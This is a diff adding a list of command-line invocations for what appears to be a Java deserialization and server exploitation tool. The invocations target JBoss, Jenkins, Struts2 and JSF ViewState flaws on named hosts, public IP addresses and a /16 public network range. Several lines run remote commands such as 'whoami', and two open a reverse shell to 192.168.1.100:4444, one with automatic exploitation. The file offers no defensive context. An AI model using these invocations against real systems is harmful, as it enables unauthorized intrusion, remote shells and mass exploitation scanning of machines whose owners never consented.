@@ -1,0 +1,19 @@
+-u http://testphp.vulnweb.com --app-unserialize --timeout 5
+-u http://demo.testfire.net --app-unserialize -H javax.faces.ViewState --cmd "whoami"
+-u http://zero.webappsecurity.com --app-unserialize -r 192.168.1.100:4444
+-u http://google-gruyere.appspot.com --app-unserialize -P http://proxy:8080 -L user:pass
+-u 44.228.249.3:8080 --jboss --timeout 5
+-u 65.61.137.117:8080 --jenkins
+-u 54.82.22.214:8080 --struts2 --cookies "JSESSIONID=abc123"
+-mode auto-scan -network 44.228.249.0/24 -ports 8080,80,443
+-mode auto-scan -network 192.168.1.0/24 -ports 8080,8443,8888 --jboss --results scan_results.log
+-mode auto-scan -network 172.67.0.0/16 -ports 80,443,8080 -P http://proxy:8080 --timeout 10
+-mode file-scan -file domains.txt -out domain_scan_results.log
+-mode file-scan -file domains.txt --app-unserialize --servlet-unserialize -out vuln_scan_results.log
+-mode file-scan -file ip_v4.txt --jboss --struts2 -out ip_scan_results.log
+-u http://altoromutual.com --app-unserialize --gadget dns --dns test.yourdomain.com
+-u http://bwapp.beeceptor.com --app-unserialize --load-gadget custom_gadget.ser --force
+-u http://dvwa.local --app-unserialize --auto-exploit -r 192.168.1.100:4444
+-u http://juice-shop.herokuapp.com --jmxtomcat
+-u http://scanme.nmap.org/path.action --struts2 --show-payload
+-u http://test.smtp.org --app-unserialize -H oldFormData --cmd "dir" --windows
